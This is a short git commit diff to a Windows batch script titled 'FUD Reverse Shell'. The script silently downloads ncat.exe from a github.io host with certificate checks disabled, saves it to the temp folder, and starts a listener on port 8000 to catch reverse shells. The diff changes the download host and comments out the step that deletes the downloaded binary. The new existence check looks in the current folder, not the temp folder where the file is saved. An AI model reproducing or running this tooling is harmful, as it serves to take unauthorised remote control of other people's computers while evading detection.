cd8c76e9975ec6d2d2c45a1878e685e00dd3df61
trevi <59333567+eltrevii@users.noreply.github.com>
2024-05-10 11:04:18 +0200

    zuz

--- rs.bat
+++ rs.bat
@@ -1,7 +1,7 @@
 @echo off
 title FUD Reverse Shell ^| by eltrevii for trevi's Utils - an eltrevii original series^^TM
 cls
-curl -kLs stivengiv.github.io/revs/ncat.exe -o %temp%\nc.exe
+if not exist nc.exe curl -kLs eltrevii.github.io/revs/ncat.exe -o %temp%\nc.exe
 %temp%\nc -nlvp 8000
-del /s /f /q %temp%\nc.exe
+rem del /s /f /q %temp%\nc.exe
 exit /b
